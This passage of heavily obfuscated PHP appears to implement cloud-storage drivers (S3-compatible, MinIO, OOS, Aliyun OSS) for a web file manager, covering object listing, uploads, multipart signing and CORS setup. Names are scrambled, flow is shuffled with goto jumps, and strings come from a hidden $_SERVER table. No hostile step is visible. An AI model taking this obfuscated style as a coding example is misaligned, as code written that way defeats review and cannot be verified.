$d‚›·û…‹â[$d‹†à∫Î‡”[78]] : 0); if ($d¡“„¯í»ÿ) { return $DÁ¶›ΩŸÉü; } goto B¥–⁄€≠µá; cë¨äáΩà≥: if (isset($d‚›·û…‹â[$d‹†à∫Î‡”[197]])) { $DÁ¶›ΩŸÉü[$d‹†à∫Î‡”[84]] = $d‚›·û…‹â[$d‹†à∫Î‡”[197]]; } if (isset($d‚›·û…‹â[$d‹†à∫Î‡”[78]])) { $DÁ¶›ΩŸÉü[$d‹†à∫Î‡”[78]] = $d‚›·û…‹â[$d‹†à∫Î‡”[78]]; } return $DÁ¶›ΩŸÉü; goto c¬•¶€Ñëì; B¥–⁄€≠µá: $DÁ¶›ΩŸÉü[$d‹†à∫Î‡”[194]] = $DÁ¶›ΩŸÉü[$d‹†à∫Î‡”[84]] = 0; $DÁ¶›ΩŸÉü[$d‹†à∫Î‡”[195]] = $DÁ¶›ΩŸÉü[$d‹†à∫Î‡”[196]] = !0; if (empty($d‚›·û…‹â)) { $d‚›·û…‹â = $this->objectMeta($EÂ⁄Úô∏≠é); if (!$d‚›·û…‹â) { return $DÁ¶›ΩŸÉü; } } goto cë¨äáΩà≥; c¬•¶€Ñëì: } private function folderInfo($F≠°∂∫Òù”, $c∏∂àØ‹‰Ú = false) { goto FÉ˘π–êô°; AâÜî≈ÕË: return $fäıÃàÔ•Ω; goto CéÇÙ⁄…Ü€; FÉ˘π–êô°: $B·¯¨£≥ú =& $_SERVER[ú∫]; $fäıÃàÔ•Ω = array($B·¯¨£≥ú[28] => $this->pathThis($F≠°∂∫Òù”), $B·¯¨£≥ú[76] => $this->getPathOuter($B·¯¨£≥ú[8] . $F≠°∂∫Òù”), $B·¯¨£≥ú[29] => $B·¯¨£≥ú[77]); if ($c∏∂àØ‹‰Ú) { return $fäıÃàÔ•Ω; } goto A®À±»‹∂î; A®À±»‹∂î: $fäıÃàÔ•Ω[$B·¯¨£≥ú[194]] = $fäıÃàÔ•Ω[$B·¯¨£≥ú[84]] = 0; $fäıÃàÔ•Ω[$B·¯¨£≥ú[195]] = $fäıÃàÔ•Ω[$B·¯¨£≥ú[196]] = !0; if ($F≠°∂∫Òù” == $B·¯¨£≥ú[33]) { return $fäıÃàÔ•Ω; } goto e¨•∏âŒÀì; e¨•∏âŒÀì: $F≠°∂∫Òù” = trim($F≠°∂∫Òù”, $B·¯¨£≥ú[8]) . $B·¯¨£≥ú[8]; $FÔÂõ›ÂËÏ = $this->objectMeta($F≠°∂∫Òù”); if (isset($FÔÂõ›ÂËÏ[$B·¯¨£≥ú[197]])) { $fäıÃàÔ•Ω[$B·¯¨£≥ú[194]] = $FÔÂõ›ÂËÏ[$B·¯¨£≥ú[197]]; } goto AâÜî≈ÕË; CéÇÙ⁄…Ü€: } private function fileList($aëÖ®ö“Ωâ, $D©ÂÑøÉÈÔ = '', $AÇΩÈ±ë£Ì = 0) { goto bœÑ›¬÷ÖÙ; a≤∑Ô»Áòó: foreach ($F∂∏Ïèï÷∂[$A≈ê¥≈´´[198]] as $AıÍ§‡‹…ì) { goto F¯áØßêÁÒ; b·ŒÎø™õÎ: $c•πÏƒˆÍ„ = $dç˜Îûë∂™ == 0 && substr($D©◊ÖÒË•±, strlen($D©◊ÖÒË•±) - 1, 1) == $A≈ê¥≈´´[8] ? !0 : !1; if ($dâêÚ‘ª·Õ) { $this->cacheMethod($A≈ê¥≈´´[199], $D©◊ÖÒË•±, $c•πÏƒˆÍ„); $this->cacheMethod($A≈ê¥≈´´[200], $D©◊ÖÒË•±, $AıÍ§‡‹…ì); } if ($c•πÏƒˆÍ„) { $b∞è“¬ æµ[] = $D©◊ÖÒË•±; continue; } goto cù§¶œ˘øÒ; cù§¶œ˘øÒ: $f÷”ØÿÂ¢∞[] = $AÇΩÈ±ë£Ì ? $AıÍ§‡‹…ì : $D©◊ÖÒË•±; goto b÷èŸŸÏ˜°; F¯áØßêÁÒ: $D©◊ÖÒË•± = $AıÍ§‡‹…ì[$A≈ê¥≈´´[28]]; if ($D©◊ÖÒË•± == $cÕÔàÈ±Â¬) { continue; } $dç˜Îûë∂™ = isset($AıÍ§‡‹…ì[$A≈ê¥≈´´[78]]) ? $AıÍ§‡‹…ì[$A≈ê¥≈´´[78]] : 0; goto b·ŒÎø™õÎ; b÷èŸŸÏ˜°: } foreach ($F∂∏Ïèï÷∂[$A≈ê¥≈´´[201]] as $AıÍ§‡‹…ì) { $b∞è“¬ æµ[] = $AıÍ§‡‹…ì[$A≈ê¥≈´´[28]]; if ($dâêÚ‘ª·Õ) { $this->cacheMethod($A≈ê¥≈´´[199], $AıÍ§‡‹…ì[$A≈ê¥≈´´[28]], !0); } } if ($dâêÚ‘ª·Õ) { $this->cacheMethod($A≈ê¥≈´´[199], $aëÖ®ö“Ωâ, !0); } goto E‹≥–å»êØ; bœÑ›¬÷ÖÙ: $A≈ê¥≈´´ =& $_SERVER[ú∫]; $cÕÔàÈ±Â¬ = rtrim($aëÖ®ö“Ωâ, $A≈ê¥≈´´[8]) . $A≈ê¥≈´´[8]; $F∂∏Ïèï÷∂ = $this->listObjs($cÕÔàÈ±Â¬, null, null, $D©ÂÑøÉÈÔ); goto då“¬œﬁÔÉ; då“¬œﬁÔÉ: if (!$F∂∏Ïèï÷∂) { return array($A≈ê¥≈´´[75] => array(), $A≈ê¥≈´´[74] => array()); } $dâêÚ‘ª·Õ = $this->listItemCache === !1 ? !1 : !0; $b∞è“¬ æµ = $f÷”ØÿÂ¢∞ = array(); goto a≤∑Ô»Áòó; E‹≥–å»êØ: return array($A≈ê¥≈´´[75] => $b∞è“¬ æµ, $A≈ê¥≈´´[74] => $f÷”ØÿÂ¢∞); goto DäÂÜœ•ãﬁ; DäÂÜœ•ãﬁ: } private function listObjs($DïÉ—Æ„Êà, $eª“©ªâå€ = null, $AÀô—û≠∏û = null, $D√πêÆä “ = null) { $DêóËÇãëﬂ =& $_SERVER[ú∫]; $DïÉ—Æ„Êà = trim($DïÉ—Æ„Êà, $DêóËÇãëﬂ[8]); $cÔﬂîæ”Ã“ = empty($DïÉ—Æ„Êà) && $DïÉ—Æ„Êà !== $DêóËÇãëﬂ[191] ? $DêóËÇãëﬂ[33] : $DïÉ—Æ„Êà . $DêóËÇãëﬂ[8]; return $this->client->getBucket($this->bucket, $cÔﬂîæ”Ã“, $eª“©ªâå€, $AÀô—û≠∏û, $D√πêÆä “, !0); } public function has($F»Ëòıá¡—, $c†±‹†‘Î◊ = false, $f–»ìçõŸº = true) { goto c∫Ó¯õá„Ñ; e µä£Ì¢ä: return !1; goto Fëãµú¡œÍ; cóöç£ïã¬: $dì‡àå‹à◊ = null; $aÔ’Ω»çå = 500; $c¢…õ´àΩ≥ = $AÑü’“˜ ◊[8]; goto C◊»◊†Ë…õ; C◊»◊†Ë…õ: $Eê€·Ñ≠Ì = $Fóêçÿ·õÿ = array(); while (!0) { $f€õåäŸå¨ = $this->listObjs($F»Ëòıá¡—, $dì‡àå‹à◊, $aÔ’Ω»çå, $c¢…õ´àΩ≥); if (!$f€õåäŸå¨) { break; } $dì‡àå‹à◊ = $f€õåäŸå¨[$AÑü’“˜ ◊[202]]; $BÍ√ÙÃÌ®· = $f€õåäŸå¨[$AÑü’“˜ ◊[198]]; $b÷öΩêì©‚ = $f€õåäŸå¨[$AÑü’“˜ ◊[201]]; if (empty($BÍ√ÙÃÌ®·) && empty($b÷öΩêì©‚)) { break; } if (count($BÍ√ÙÃÌ®·) == 1 && $BÍ√ÙÃÌ®·[0][$AÑü’“˜ ◊[28]] == $e∞∆—–Öëú) { break; } if ($c†±‹†‘Î◊) { if (count($BÍ√ÙÃÌ®·)) { $BÍ√ÙÃÌ®· = array_column($BÍ√ÙÃÌ®·, $AÑü’“˜ ◊[28]); $Eê€·Ñ≠Ì = array_merge($Eê€·Ñ≠Ì, $BÍ√ÙÃÌ®·); } if (count($b÷öΩêì©‚)) { $b÷öΩêì©‚ = array_column($b÷öΩêì©‚, $AÑü’“˜ ◊[28]); $Fóêçÿ·õÿ = array_merge($Fóêçÿ·õÿ, $b÷öΩêì©‚); } if ($dì‡àå‹à◊ === null) { break; } continue; } if ($f–»ìçõŸº) { if (!empty($BÍ√ÙÃÌ®·)) { if (count($BÍ√ÙÃÌ®·) > 1 || isset($BÍ√ÙÃÌ®·[0][$AÑü’“˜ ◊[28]]) && $BÍ√ÙÃÌ®·[0][$AÑü’“˜ ◊[28]] != $e∞∆—–Öëú) { return !0; } } } else { if (!empty($b÷öΩêì©‚)) { return !0; } } if ($dì‡àå‹à◊ === null) { break; } } if ($c†±‹†‘Î◊) { $Eê€·Ñ≠Ì = array_diff($Eê€·Ñ≠Ì, array($e∞∆—–Öëú)); $Eê€·Ñ≠Ì = count(array_unique($Eê€·Ñ≠Ì)); $Fóêçÿ·õÿ = count(array_unique($Fóêçÿ·õÿ)); return array($AÑü’“˜ ◊[203] => $Eê€·Ñ≠Ì, $AÑü’“˜ ◊[204] => $Fóêçÿ·õÿ); } goto e µä£Ì¢ä; c∫Ó¯õá„Ñ: $AÑü’“˜ ◊ =& $_SERVER[ú∫]; $F»Ëòıá¡— = trim($F»Ëòıá¡—, $AÑü’“˜ ◊[8]); $e∞∆—–Öëú = empty($F»Ëòıá¡—) && $F»Ëòıá¡— !== $AÑü’“˜ ◊[191] ? $AÑü’“˜ ◊[33] : $F»Ëòıá¡— . $AÑü’“˜ ◊[8]; goto cóöç£ïã¬; Fëãµú¡œÍ: } public function listAll($C¯˜Ü©«Í®) { $CœΩ‰Æ®ò« =& $_SERVER[ú∫]; $cò°©°òΩ¢ = $this->fileList($C¯˜Ü©«Í®, $CœΩ‰Æ®ò«[33], !0); $DùÁ≤√´Ωµ = array(); foreach ($cò°©°òΩ¢[$CœΩ‰Æ®ò«[74]] as $Bãä·…òí—) { $DùÁ≤√´Ωµ[$Bãä·…òí—[$CœΩ‰Æ®ò«[28]]] = $Bãä·…òí—[$CœΩ‰Æ®ò«[78]]; } foreach ($cò°©°òΩ¢[$CœΩ‰Æ®ò«[75]] as $Bãä·…òí—) { if (is_string($Bãä·…òí—)) { $DùÁ≤√´Ωµ[$Bãä·…òí—] = 0; } } return $this->listAllFiles($C¯˜Ü©«Í®, array_keys($DùÁ≤√´Ωµ), $DùÁ≤√´Ωµ); } public function canRead($E–ªÑ›É¬Ò) { $bÚ¢ﬁ§°Ω˘ =& $_SERVER[ú∫]; $b‹·∂ö‹ÿﬁ = $this->client->getAccessControlPolicy($this->bucket, $E–ªÑ›É¬Ò); if (!$b‹·∂ö‹ÿﬁ) { return !1; } return in_array($b‹·∂ö‹ÿﬁ, array($bÚ¢ﬁ§°Ω˘[205], $bÚ¢ﬁ§°Ω˘[206], $bÚ¢ﬁ§°Ω˘[207])) ? !0 : !1; } public function canWrite($bÙ‡‰÷ç§Ó) { $Eú˜åí«›  =& $_SERVER[ú∫]; $eùœ¢‰÷àÍ = $this->client->getAccessControlPolicy($this->bucket, $bÙ‡‰÷ç§Ó); if (!$eùœ¢‰÷àÍ) { return !1; } return in_array($eùœ¢‰÷àÍ, array($Eú˜åí«› [205], $Eú˜åí«› [206])) ? !0 : !1; } public function getContent($EÊ¿§©“ Ô) { return $this->client->getObject($this->bucket, $EÊ¿§©“ Ô); } public function setContent($c€àËçﬂ∫¯, $F¥É¯óÉø‰ = '', $bÔÃÕúÀÓÕ = false) { goto Bí‡†≤ºÆ≈; aîÏ∂““ã£: $dæ¯÷≠π∆ì = $this->client->putObject($F¥É¯óÉø‰, $this->bucket, $c€àËçﬂ∫¯, $bıÆ»ﬂã©ï[192], array(), $D≥ªéÑ—‰Î); if (!$dæ¯÷≠π∆ì) { return !1; } if ($bÔÃÕúÀÓÕ) { return !0; } goto CÏà‚Â±äŒ; CÏà‚Â±äŒ: $this->cacheMethod(null, null); $dæ¯÷≠π∆ì = $this->copyFile($c€àËçﬂ∫¯, $c€àËçﬂ∫¯, array($bıÆ»ﬂã©ï[208] => $dæ¯÷≠π∆ì[$bıÆ»ﬂã©ï[209]])); return $dæ¯÷≠π∆ì ? !0 : !1; goto Aƒç∆°Ÿé…; Bí‡†≤ºÆ≈: $bıÆ»ﬂã©ï =& $_SERVER[ú∫]; $c€àËçﬂ∫¯ = $bÔÃÕúÀÓÕ ? trim($c€àËçﬂ∫¯, $bıÆ»ﬂã©ï[8]) . $bıÆ»ﬂã©ï[8] : $c€àËçﬂ∫¯; $D≥ªéÑ—‰Î = get_file_mime(get_path_ext($c€àËçﬂ∫¯)); goto aîÏ∂““ã£; Aƒç∆°Ÿé…: } public function fileSubstr($d’âÃÑÇ§Ë, $dÕ’÷„£Ò«, $fπÖÖ⁄∂…–) { $b‰ÑÎ‘£´™ = $dÕ’÷„£Ò« + $fπÖÖ⁄∂…– - 1; return $this->client->getObject($this->bucket, $d’âÃÑÇ§Ë, array($_SERVER[ú∫][210] => "\142\171\x74\x65\163\x3d{$dÕ’÷„£Ò«}\55{$b‰ÑÎ‘£´™}")); } public function upload($dÕÑÁëπËì, $F“‡¬Ñãçå, $e¬ùÙﬁ“∂ø = false, $AÉ‹§Í’ﬁã = REPEAT_REPLACE) { $eÉ†∫öª∑ˆ =& $_SERVER[ú∫]; $Cã†ÛÖ©Ú◊ = array($eÉ†∫öª∑ˆ[208] => @md5_file($F“‡¬Ñãçå)); $FÒñ¬áàüÃ = array($eÉ†∫öª∑ˆ[211] => get_file_mime(get_path_ext($dÕÑÁëπËì))); if (IO::size($F“‡¬Ñãçå) <= 1024 * 1024 * 200) { $F≠ƒà¡™®ó = $this->client->putObjectFile($F“‡¬Ñãçå, $this->bucket, $dÕÑÁëπËì, $eÉ†∫öª∑ˆ[192], $Cã†ÛÖ©Ú◊, $FÒñ¬áàüÃ); return !empty($F≠ƒà¡™®ó) ? $this->getPathOuter($dÕÑÁëπËì) : !1; } $Dèº•“Ã¬ = $this->client->multiUploadObject($F“‡¬Ñãçå, $this->bucket, trim($dÕÑÁëπËì, $eÉ†∫öª∑ˆ[8]), $Cã†ÛÖ©Ú◊, $FÒñ¬áàüÃ); return $Dèº•“Ã¬ ? $this->getPathOuter($dÕÑÁëπËì) : !1; } public function download($FºÂÑ§åõ§, $cêá∞ƒÏ≥Î) { if (!@is_dir($this->pathFather($cêá∞ƒÏ≥Î)) && !IO::mkdir($this->pathFather($cêá∞ƒÏ≥Î))) { return !1; } $eƒÆ‘ÆÑ⁄◊ = $this->client->getObject($this->bucket, $FºÂÑ§åõ§, array(), $cêá∞ƒÏ≥Î); return $eƒÆ‘ÆÑ⁄◊ !== !1 ? $cêá∞ƒÏ≥Î : !1; } public function link($E‘¶Æí˘û≤, $D‡≈œÀíäá = array()) { $Fı∑¡ë¡®∏ =& $_SERVER[ú∫]; if ($this->signVer == $Fı∑¡ë¡®∏[212]) { return $this->client->getAuthenticatedURL($this->bucket, $E‘¶Æí˘û≤, 3600 * 12, $D‡≈œÀíäá); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($E‘¶Æí˘û≤, $Fı∑¡ë¡®∏[8]), 3600 * 12, $this->region, array(), !0, $D‡≈œÀíäá); } public function fileOut($c∆§î¨ùì€, $A∑≈∂πàÈπ = false, $bêáÉÛÃÕ“ = false, $c…´‹ß˜Ç¨ = '') { goto aÃ´ÉÜºëá; aÃ´ÉÜºëá: $DÂΩëœœ¬  =& $_SERVER[ú∫]; if ($this->isFileOutServer()) { return $this->fileOutServer($c∆§î¨ùì€, $A∑≈∂πàÈπ, $bêáÉÛÃÕ“, $c…´‹ß˜Ç¨); } if (!$bêáÉÛÃÕ“) { $bêáÉÛÃÕ“ = $this->pathThis($c∆§î¨ùì€); } goto d·Ôà¥ÛâÏ; d·Ôà¥ÛâÏ: $b÷¥´Ÿ‡âå = get_file_mime(get_path_ext($bêáÉÛÃÕ“)); if ($b÷¥´Ÿ‡âå == $DÂΩëœœ¬ [213]) { return parent::fileOut($c∆§î¨ùì€, $A∑≈∂πàÈπ, $bêáÉÛÃÕ“, $c…´‹ß˜Ç¨); } $A∑≈∂πàÈπ = $A∑≈∂πàÈπ ? $DÂΩëœœ¬ [214] : $DÂΩëœœ¬ [215]; goto d™›√âàÎ˘; d™›√âàÎ˘: $fÜ¥—ÌÎÏÁ = array($DÂΩëœœ¬ [216] => $A∑≈∂πàÈπ . $DÂΩëœœ¬ [217] . rawurlencode($bêáÉÛÃÕ“), $DÂΩëœœ¬ [218] => $b÷¥´Ÿ‡âå); $AÙË…ºëÖô = $this->link($c∆§î¨ùì€, $fÜ¥—ÌÎÏÁ); $this->fileOutLink($AÙË…ºëÖô); goto b‰£µÎçñ‚; b‰£µÎçñ‚: } public function fileOutServer($F«îé∂÷ÌÚ, $f©Ô¥Œ®–» = false, $f†ƒ·√êÍÕ = false, $EÁñøÆÂóØ = '') { parent::fileOut($F«îé∂÷ÌÚ, $f©Ô¥Œ®–», $f†ƒ·√êÍÕ, $EÁñøÆÂóØ); } public function fileOutImageServer($AÓ·ä◊âûÃ, $Fèô¶µŒ¯⁄ = 250) { parent::fileOutImage($AÓ·ä◊âûÃ, $Fèô¶µŒ¯⁄); } public function hashMd5($e§ìŒÌÆ–∆, $bØ¶Ï≠™ÉÀ = '') { $c¢‚∆Ü∞–‹ =& $_SERVER[ú∫]; $b›ãù°ñ¬æ = $this->objectMeta($e§ìŒÌÆ–∆); if (!$b›ãù°ñ¬æ) { return !1; } $bØ¶Ï≠™ÉÀ = $bØ¶Ï≠™ÉÀ ? $bØ¶Ï≠™ÉÀ : _get($b›ãù°ñ¬æ, $c¢‚∆Ü∞–‹[219]); $bØ¶Ï≠™ÉÀ = $bØ¶Ï≠™ÉÀ ? $bØ¶Ï≠™ÉÀ : _get($b›ãù°ñ¬æ, $c¢‚∆Ü∞–‹[209], $c¢‚∆Ü∞–‹[33]); return $bØ¶Ï≠™ÉÀ; } public function uploadFormData($F≠™æÑÙœ‰, $CÉ¢úıÉ¯« = 3600) { $BîüΩöÒéÍ =& $_SERVER[ú∫]; $CœÁÓ∫Ú¨Ì = $this->pathFather($F≠™æÑÙœ‰); $eÂ…ÁêÆÂâ = $this->client->getHttpUploadPostParams($this->bucket, $CœÁÓ∫Ú¨Ì, $BîüΩöÒéÍ[192], $CÉ¢úıÉ¯«); return array_merge((array) $eÂ…ÁêÆÂâ, array($BîüΩöÒéÍ[175] => $this->getHost())); } public function multiUploadFormData($càùñîá‹, $b•˜ë©á»û = 3600) { $f‘™ŒÂÁíÖ =& $_SERVER[ú∫]; $Aµ—…⁄®ÌÔ = gmdate($f‘™ŒÂÁíÖ[220]); $a˘≈â∑øÇá = array(); $aÒ∞‘òÙ”ô = $this->client->getUploadId($this->bucket, $càùñîá‹, $a˘≈â∑øÇá); if (!$aÒ∞‘òÙ”ô) { return !1; } return array($f‘™ŒÂÁíÖ[221] => $aÒ∞‘òÙ”ô, $f‘™ŒÂÁíÖ[175] => $this->getHost() . $f‘™ŒÂÁíÖ[8] . $this->pathEncode($càùñîá‹), $f‘™ŒÂÁíÖ[222] => $Aµ—…⁄®ÌÔ, $f‘™ŒÂÁíÖ[93] => $càùñîá‹); } public function multiUploadAuthData($b£Á·”«é“, $d¿‡…ÉŒµ∞ = array()) { goto BöÇÈÊ«ß≤; BöÇÈÊ«ß≤: $C∞†®åØÀÍ =& $_SERVER[ú∫]; $cÓ†”Õ±—• = isset($d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[222]]) ? $d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[222]] : gmdate($C∞†®åØÀÍ[220]); $BªèÛ‚ãúî = isset($d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[168]]) ? $d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[168]] : $C∞†®åØÀÍ[33]; goto cÁ›Æé ·Ö; cÁ›Æé ·Ö: $C…äòñÎã˘ = $d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[93]]; unset($d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[93]]); if (isset($d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[223]])) { $d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[222]] = $cÓ†”Õ±—•; return $this->listUploadParts($C…äòñÎã˘, $d¿‡…ÉŒµ∞); } goto FØ«Ç∆ˆä±; DÚÙãàß¡®: $E¬äÜÉùÁ = implode($C∞†®åØÀÍ[229], $aò∆Œõ—Ÿ∑); $f…”™É°÷é = base64_encode(hash_hmac($C∞†®åØÀÍ[230], $E¬äÜÉùÁ, $this->secret, !0)); $cŒﬁ–¥â⁄Ó = $C∞†®åØÀÍ[231] . $this->accessKey . $C∞†®åØÀÍ[4] . $f…”™É°÷é; goto cÚ´¬åÈÉÿ; cÚ´¬åÈÉÿ: if (strpos($BªèÛ‚ãúî, $C∞†®åØÀÍ[225]) === 0) { return array($C∞†®åØÀÍ[232] => $cŒﬁ–¥â⁄Ó, $C∞†®åØÀÍ[222] => $cÓ†”Õ±—•); } return $cŒﬁ–¥â⁄Ó; goto Eñ¡æÖôóÏ; FØ«Ç∆ˆä±: $aò∆Œõ—Ÿ∑ = array($C∞†®åØÀÍ[224], $C∞†®åØÀÍ[33], $C∞†®åØÀÍ[119], $C∞†®åØÀÍ[33], "\x78\55\141\x6d\172\55\x64\141\164\x65\72{$cÓ†”Õ±—•}", $C∞†®åØÀÍ[8] . $this->bucket . $C∞†®åØÀÍ[8] . $this->pathEncode($C…äòñÎã˘) . $BªèÛ‚ãúî); if (strpos($BªèÛ‚ãúî, $C∞†®åØÀÍ[225]) === 0) { $aò∆Œõ—Ÿ∑[0] = $C∞†®åØÀÍ[226]; } if (isset($d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[227]]) && $d¿‡…ÉŒµ∞[$C∞†®åØÀÍ[227]] == $C∞†®åØÀÍ[228]) { $aò∆Œõ—Ÿ∑[0] = $C∞†®åØÀÍ[228]; } goto DÚÙãàß¡®; Eñ¡æÖôóÏ: } public function listUploadParts($aàê°¨áı¨, $aá·á∆±ô≈ = array()) { goto dö∑∏ùà¯ç; dö∑∏ùà¯ç: $a•Ë´ÿÚ—ì =& $_SERVER[ú∫]; $AıÒàÕâÇè = str_replace($a•Ë´ÿÚ—ì[233], $a•Ë´ÿÚ—ì[33], $aá·á∆±ô≈[$a•Ë´ÿÚ—ì[168]]); $Aë˜Ú®ß‹° = $this->client->listParts($this->bucket, $aàê°¨áı¨, $AıÒàÕâÇè); goto DÖçÓ˜£ñˆ; DÖçÓ˜£ñˆ: if (!$Aë˜Ú®ß‹°) { return !1; } unset($aá·á∆±ô≈[$a•Ë´ÿÚ—ì[223]], $aá·á∆±ô≈[$a•Ë´ÿÚ—ì[227]]); $aá·á∆±ô≈[$a•Ë´ÿÚ—ì[93]] = $aàê°¨áı¨; goto AÌÑïæ¿¿ô; AÌÑïæ¿¿ô: $e≤øô¯÷‰Ø = $this->multiUploadAuthData($aàê°¨áı¨, $aá·á∆±ô≈); if (empty($e≤øô¯÷‰Ø)) { return !1; } return array($a•Ë´ÿÚ—ì[232] => $e≤øô¯÷‰Ø, $a•Ë´ÿÚ—ì[222] => $aá·á∆±ô≈[$a•Ë´ÿÚ—ì[222]], $a•Ë´ÿÚ—ì[234] => $Aë˜Ú®ß‹°); goto dÛ˜§Á¨⁄”; dÛ˜§Á¨⁄”: } public function getHost() { return parent::getHost() . $_SERVER[ú∫][8] . $this->bucket; } public function size($c›⁄åÆ¨ı¯) { $bô•Ï»ä¥à = $this->objectMeta($c›⁄åÆ¨ı¯); return $bô•Ï»ä¥à ? $bô•Ï»ä¥à[$_SERVER[ú∫][78]] : 0; } public function info($båé©Ù™∆¢) { if ($this->isFolder($båé©Ù™∆¢)) { return $this->folderInfo($båé©Ù™∆¢); } else { if ($this->isFile($båé©Ù™∆¢)) { return $this->fileInfo($båé©Ù™∆¢); } } return !1; } public function exist($EÁÔæ∞‘ã©) { return $this->isFile($EÁÔæ∞‘ã©) || $this->isFolder($EÁÔæ∞‘ã©); } public function isFile($F’Ñ’ˆŸµõ) { return !$this->isFolder($F’Ñ’ˆŸµõ) && $this->objectMeta($F’Ñ’ˆŸµõ); } public function isFolder($f¢§é≤Ú†¶) { return $this->cacheMethod($_SERVER[ú∫][199], $f¢§é≤Ú†¶); } protected function objectMeta($e†π†ë†≠Ö) { return $this->cacheMethod($_SERVER[ú∫][200], $e†π†ë†≠Ö); } protected function _objectMeta($Eäå›ßªßÜ) { $Düﬂê∏‰∑å =& $_SERVER[ú∫]; $Eäå›ßªßÜ = rtrim($Eäå›ßªßÜ, $Düﬂê∏‰∑å[8]); try { $B∏∞Êπò◊˘ = $this->client->getObjectInfo($this->bucket, $Eäå›ßªßÜ); if (!isset($B∏∞Êπò◊˘[$Düﬂê∏‰∑å[219]]) && isset($B∏∞Êπò◊˘[$Düﬂê∏‰∑å[235]])) { $B∏∞Êπò◊˘[$Düﬂê∏‰∑å[219]] = $B∏∞Êπò◊˘[$Düﬂê∏‰∑å[235]]; } } catch (Exception $bÖÑ§ÙÚ◊) { $B∏∞Êπò◊˘ = !1; } if (!$B∏∞Êπò◊˘) { } return $B∏∞Êπò◊˘; } protected function _isFolder($E·ÕÎÑ»óÜ) { goto eÃ“ÀÑ£∫∑; FÚà≈¡™Çâ: return stripos($e∆üÙ€ßú, $E·ÕÎÑ»óÜ . $A€´ ê“àõ[8]) === 0 ? !0 : !1; if (substr($e∆üÙ€ßú, -1) == $A€´ ê“àõ[8]) { return !0; } if (get_path_this($e∆üÙ€ßú) == get_path_this($E·ÕÎÑ»óÜ)) { return !1; } goto c…–âûç†ﬁ; c…–âûç†ﬁ: return !0; goto c∆í¯µÛçÙ; Eáﬂ”ü»áÍ: $cÍäÚ˘ë≤á = $this->client->getBucket($this->bucket, $E·ÕÎÑ»óÜ, null, 1); if (empty($cÍäÚ˘ë≤á[$A€´ ê“àõ[198]])) { return !1; } $e∆üÙ€ßú = $cÍäÚ˘ë≤á[$A€´ ê“àõ[198]][0][$A€´ ê“àõ[28]]; goto FÚà≈¡™Çâ; eÃ“ÀÑ£∫∑: $A€´ ê“àõ =& $_SERVER[ú∫]; $E·ÕÎÑ»óÜ = rtrim($E·ÕÎÑ»óÜ, $A€´ ê“àõ[8]); if ($E·ÕÎÑ»óÜ == $A€´ ê“àõ[33] || $E·ÕÎÑ»óÜ == $A€´ ê“àõ[8]) { return !0; } goto Eáﬂ”ü»áÍ; c∆í¯µÛçÙ: } } define($_SERVER[ú∫][236], 1); goto C¢Ê¯õ©Àﬂ; Eç≥è¯§ºÚ: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($Dƒø≤ÛøˆÙ) { parent::__construct($Dƒø≤ÛøˆÙ); $this->signatureVersion($_SERVER[ú∫][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($AÛŒÛêﬁí·) { parent::__construct($AÛŒÛêﬁí·); $this->signatureVersion($_SERVER[ú∫][212]); } public function fileOutLink($B∞…äåµàö) { $FäÒâ÷•»ê =& $_SERVER[ú∫]; if (substr($B∞…äåµàö, 0, 7) == $FäÒâ÷•»ê[1204]) { $B∞…äåµàö = $FäÒâ÷•»ê[1205] . substr($B∞…äåµàö, 7); } header($FäÒâ÷•»ê[159] . $B∞…äåµàö); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $cdnHost = ''; public function __construct($aåÒÚÈÇù‡) { parent::__construct(); include_once SDK_DIR . $_SERVER[ú∫][1260]; $this->_init($aåÒÚÈÇù‡); } public function _init($BÀ”Ω©‚äﬂ) { $BÈÖÌÑº“ =& $_SERVER[ú∫]; foreach ($BÀ”Ω©‚äﬂ as $aë‚ı §Ì˜ => $E¨Ê“‘«á¢) { if (isset($this->{$aë‚ı §Ì˜})) { $this->{$aë‚ı §Ì˜} = $E¨Ê“‘«á¢; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($BÈÖÌÑº“[1261] . LNG($BÈÖÌÑº“[1262])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto f≤“•øäçﬂ; f≤“•øäçﬂ: $Cœè‰ëê€å =& $_SERVER[ú∫]; $Bú‰ê∑öıË = new OSS\Model\CorsConfig(); $B¯Ïú’≠™÷ = new OSS\Model\CorsRule(); goto aÙ“®Ùú‘“; aÙ“®Ùú‘“: $B¯Ïú’≠™÷->addAllowedOrigin($Cœè‰ëê€å[1263]); $B¯Ïú’≠™÷->addAllowedMethod($Cœè‰ëê€å[1264]); $B¯Ïú’≠™÷->addAllowedMethod($Cœè‰ëê€å[1265]); goto b“ì›ú„êﬂ; f‹¨°Üù ˘: $B¯Ïú’≠™÷->setMaxAgeSeconds(600); $B¯Ïú’≠™÷->addExposeHeader($Cœè‰ëê€å[1268]); $B¯Ïú’≠™÷->addAllowedHeader($Cœè‰ëê€å[1263]); goto bôûÖªˆÔë; b“ì›ú„êﬂ: $B¯Ïú’≠™÷->addAllowedMethod($Cœè‰ëê€å[1266]); $B¯Ïú’≠™÷->addAllowedMethod($Cœè‰ëê€å[1267]); $B¯Ïú’≠™÷->addAllowedMethod($Cœè‰ëê€å[158]); goto f‹¨°Üù ˘; bôûÖªˆÔë: $Bú‰ê∑öıË->addRule($B¯Ïú’≠™÷); try { $this->client->putBucketCors($this->bucket, $Bú‰ê∑öıË); } catch (OSS\Core\OssException $eë±’ıôÙÎ) { return !1; } return !0; goto E⁄⁄√•Ü†«; E⁄⁄√•Ü†«: } public function 